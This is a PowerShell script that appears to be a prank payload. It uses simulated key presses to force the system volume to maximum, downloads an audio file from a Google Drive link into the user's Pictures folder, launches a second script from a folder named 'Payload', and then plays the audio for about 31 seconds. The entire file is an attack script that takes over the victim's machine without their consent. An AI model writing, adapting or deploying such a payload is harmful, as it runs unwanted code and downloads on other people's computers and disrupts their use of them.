﻿Add-Type -AssemblyName presentationCore


Function Set-SoundVolume {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $volume
    )
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    $obj = New-Object -ComObject WScript.Shell
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    for( $i = 0; $i -lt $keyPresses; $i++ )
    {
        $obj.SendKeys( [char] 175 )
    }
}
Set-SoundVolume 100
Start-Sleep -Milliseconds 50


$way = [Environment]::GetFolderPath("MyPictures")
$way3 = "$way\fuk.mp3"
$urlaudio = "https://drive.google.com/uc?export=download&id=1_MWK_k1ISL3yoy4pSFeiCu4o9ERyEHVh"


Invoke-WebRequest $urlaudio -OutFile $way3

cd "$way\Payload"
Start-Process powershell -NoNewWindow -ArgumentList "-noexit -command ""& '.\VideoRound2.ps1'"""
Start-Sleep -Seconds 6


$wmplayer = New-Object System.Windows.Media.MediaPlayer
$wmplayer.Open($way3)
Start-Sleep -Milliseconds 100
$wmplayer.Play()
Start-Sleep -Seconds 31
$wmplayer.Stop()
$wmplayer.Close()